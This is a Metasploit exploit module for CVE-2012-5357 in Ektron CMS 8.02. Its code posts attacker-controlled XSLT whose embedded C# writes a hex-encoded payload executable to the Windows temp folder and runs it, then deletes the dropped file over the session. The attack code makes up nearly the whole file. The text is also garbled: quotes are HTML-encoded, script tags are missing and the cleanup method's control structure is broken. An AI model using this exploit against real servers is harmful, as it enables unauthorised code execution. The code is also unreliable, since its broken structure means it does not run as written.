# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;
require &#039;msf/core/exploit/file_dropper&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Ektron 8.02 XSLT Transform Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability in Ektron CMS 8.02 (before SP5). The
        vulnerability exists due to the insecure usage of XslCompiledTransform, using a
        XSLT controlled by the user. The module has been tested successfully on Ektron CMS
        8.02 over Windows 2003 SP2, which allows to execute arbitrary code with NETWORK
        SERVICE privileges.
      },
      &#039;Author&#039;         => [
        &#039;Unknown&#039;, # Vulnerability discovery, maybe Richard Lundeen from http://webstersprodigy.net/ ?
        &#039;juan vazquez&#039; # Metasploit module
      ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2012-5357&#039;],
          [ &#039;URL&#039;, &#039;http://webstersprodigy.net/2012/10/25/cve-2012-5357cve-1012-5358-cool-ektron-xslt-rce-bugs/&#039; ],
          [ &#039;URL&#039;, &#039;http://technet.microsoft.com/en-us/security/msvr/msvr12-016&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;           => 2048,
          &#039;StackAdjustment&#039; => -3500
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039;        =>
        [
          [&#039;Windows 2003 SP2 / Ektron CMS400 8.02&#039;, { }],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Oct 16 2012&#039;
    ))

    register_options(
      [
        OptInt.new(&#039;HTTP_DELAY&#039;, [true, &#039;Time that the HTTP Server will wait for the VBS payload request&#039;, 60]),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI path of the Ektron CMS&#039;, &#039;/cms400min/&#039;])
      ], self.class )
  end

  def check

    fingerprint = rand_text_alpha(5 + rand(5))
    xslt_data = <<-XSLT
<?xml version=&#039;1.0&#039;?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
<![CDATA[
public string xml()
{
return "#{fingerprint}";
}
]]>
</msxsl:script>
<xsl:template match="/">
<xsl:value-of select="user:xml()"/>
</xsl:template>
</xsl:stylesheet>
    XSLT

    res = send_request_cgi(
      {
        &#039;uri&#039;     => "#{uri_path}WorkArea/ContentDesigner/ekajaxtransform.aspx",
        &#039;version&#039; => &#039;1.1&#039;,
        &#039;method&#039;  => &#039;POST&#039;,
        &#039;ctype&#039;   => "application/x-www-form-urlencoded; charset=UTF-8",
        &#039;headers&#039; => {
          "Referer" => build_referer
        },
        &#039;vars_post&#039;    => {
          "xml" => rand_text_alpha(5 + rand(5)),
          "xslt" => xslt_data
        }
      })

    if res and res.code == 200 and res.body =~ /#{fingerprint}/ and res.body !~ /Error/
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end


  def on_new_session(session)
      session.core.use("stdapi") unless session.ext.aliases.include?("stdapi")
    end

    @dropped_files.delete_if do |file|
      win_file = file.gsub("/", "\\\\")
        begin
          windir = session.fs.file.expand_path("%WINDIR%")
          win_file = "#{windir}\\Temp\\#{win_file}"
          # fs.file.rm().  Until that has been implemented, remove the
          # read-only flag with a command.
          session.shell_command_token(%Q|attrib.exe -r "#{win_file}"|)
          session.fs.file.rm(win_file)
          print_good("Deleted #{file}")
          true
          print_error("Failed to delete #{win_file}")
          false
        end

      end
    end

  end

  def uri_path
    uri_path = target_uri.path
    uri_path << "/" if uri_path[-1, 1] != "/"
    uri_path
  end

  def build_referer
    if datastore[&#039;SSL&#039;]
      schema = "https://"
    else
      schema = "http://"
    end

    referer = schema
    referer << rhost
    referer << ":#{rport}"
    referer << uri_path
    referer
  end

  def exploit

    print_status("Generating the EXE Payload and the XSLT...")
    exe_data = generate_payload_exe
    exe_string = Rex::Text.to_hex(exe_data)
    exename = rand_text_alpha(5 + rand(5))
    fingerprint = rand_text_alpha(5 + rand(5))
    xslt_data = <<-XSLT
<?xml version=&#039;1.0&#039;?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
<![CDATA[
public string xml()
{
char[] charData = "#{exe_string}".ToCharArray();
string fileName = @"C:\\windows\\temp\\#{exename}.txt";
System.IO.FileStream fs = new System.IO.FileStream(fileName, System.IO.FileMode.Create);
System.IO.BinaryWriter bw = new System.IO.BinaryWriter(fs);
for (int i = 0; i < charData.Length; i++)
{
  bw.Write( (byte) charData[i]);
}
bw.Close();
fs.Close();
System.Diagnostics.Process p = new System.Diagnostics.Process();
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.FileName = @"C:\\windows\\temp\\#{exename}.txt";
p.Start();
return "#{fingerprint}";
}
]]>
</msxsl:script>
<xsl:template match="/">
<xsl:value-of select="user:xml()"/>
</xsl:template>
</xsl:stylesheet>
    XSLT

    print_status("Trying to run the xslt transformation...")
    res = send_request_cgi(
      {
        &#039;uri&#039;     => "#{uri_path}WorkArea/ContentDesigner/ekajaxtransform.aspx",
        &#039;version&#039; => &#039;1.1&#039;,
        &#039;method&#039;  => &#039;POST&#039;,
        &#039;ctype&#039;   => "application/x-www-form-urlencoded; charset=UTF-8",
        &#039;headers&#039; => {
          "Referer" => build_referer
        },
        &#039;vars_post&#039;    => {
          "xml" => rand_text_alpha(5 + rand(5)),
          "xslt" => xslt_data
        }
      })
    if res and res.code == 200 and res.body =~ /#{fingerprint}/ and res.body !~ /Error/
      print_good("Exploitation was successful")
      register_file_for_cleanup("#{exename}.txt")
    else
      fail_with(Exploit::Failure::Unknown, "There was an unexpected response to the xslt transformation request")
    end

  end
end

